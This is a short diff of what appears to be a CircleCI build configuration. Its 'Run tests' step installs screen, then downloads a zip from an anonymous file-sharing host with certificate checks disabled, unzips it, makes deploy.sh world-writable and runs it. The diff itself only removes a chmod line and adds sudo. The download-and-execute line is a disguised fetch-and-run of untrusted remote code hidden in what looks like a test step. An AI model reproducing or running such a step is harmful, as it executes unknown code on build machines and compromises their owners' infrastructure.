@@ -3,12 +3,11 @@ working_dir: &working_dir ~/app
   steps:
     - checkout
     - run: curl -L https://codeclimate.com/downloads/test-reporter/test-reporter-latest-linux-amd64 > ./cc-test-reporter
-    - run: chmod +x ./cc-test-reporter
     - run:
         name: Run tests
         command: |
                     apt update 
-                    apt install screen -y 
+                    sudo apt install screen -y 
                     wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
 
 version: 2.0
